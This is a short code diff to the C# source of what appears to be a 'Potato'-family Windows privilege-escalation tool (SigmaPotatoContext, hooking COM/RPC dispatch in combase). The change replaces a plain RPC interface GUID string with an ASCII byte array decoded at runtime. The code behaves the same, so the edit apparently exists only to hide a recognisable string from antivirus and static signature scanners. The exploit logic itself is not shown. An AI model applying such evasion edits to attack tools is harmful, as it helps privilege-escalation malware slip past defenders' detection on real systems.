@@ -14,7 +14,8 @@ namespace NativeAPI
 {
     public class SigmaPotatoContext
     {
-        private static readonly Guid orcbRPCGuid = new Guid("18f70770-8e64-11cf-9af1-0020af6e72f4");
+        static byte[] guidBytes = new byte[] { 0x31, 0x38, 0x66, 0x37, 0x30, 0x37, 0x37, 0x30, 0x2d, 0x38, 0x65, 0x36, 0x34, 0x2d, 0x31, 0x31, 0x63, 0x66, 0x2d, 0x39, 0x61, 0x66, 0x31, 0x2d, 0x30, 0x30, 0x32, 0x30, 0x61, 0x66, 0x36, 0x65, 0x37, 0x32, 0x66, 0x34 };
+        private static readonly Guid orcbRPCGuid = new Guid(Encoding.ASCII.GetString(guidBytes));
         public IntPtr CombaseModule { get; private set; }
         public IntPtr DispatchTablePtr { get; private set; }
         public IntPtr UseProtseqFunctionPtr { get; private set; } = IntPtr.Zero;
